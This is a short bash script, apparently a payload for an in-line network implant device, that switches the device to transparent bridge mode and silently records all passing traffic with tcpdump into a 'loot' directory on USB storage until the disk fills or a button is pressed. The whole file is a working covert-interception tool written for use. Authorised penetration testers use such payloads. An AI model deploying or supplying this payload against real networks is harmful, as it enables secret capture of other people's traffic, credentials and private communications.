#!/bin/bash
# TCPDump payload v1.0

function monitor_space() {
	while true
	do
		[[ $(df | grep /mnt | awk '{print $4}') -lt 10000 ]] && {
			kill $1
			LED G SUCCESS
			sync
			break
		}
		sleep 5
	done
}

function finish() {
	# Kill TCPDump and sync filesystem
	kill $1
	wait $1
	sync

	# Indicate successful shutdown
	LED R SUCCESS
	sleep 1

	# Halt the system
	LED OFF
	halt
}

function run() {
	# Create loot directory
	mkdir -p /mnt/loot/tcpdump &> /dev/null
	
	# Set networking to TRANSPARENT mode and wait five seconds
	NETMODE TRANSPARENT
	sleep 5
	
	# Start tcpdump on the bridge interface
	tcpdump -i br-lan -w /mnt/loot/tcpdump/dump_$(date +%Y-%m-%d-%H%M%S).pcap &>/dev/null &
	tpid=$!

	# Wait for button to be pressed (disable button LED)
	NO_LED=true BUTTON
	finish $tpid
}


# This payload will only run if we have USB storage
[[ ! -f /mnt/NO_MOUNT ]] && {
	LED ATTACK
	run &
	monitor_space $! &
} || {
	LED FAIL
	NETMODE TRANSPARENT
}
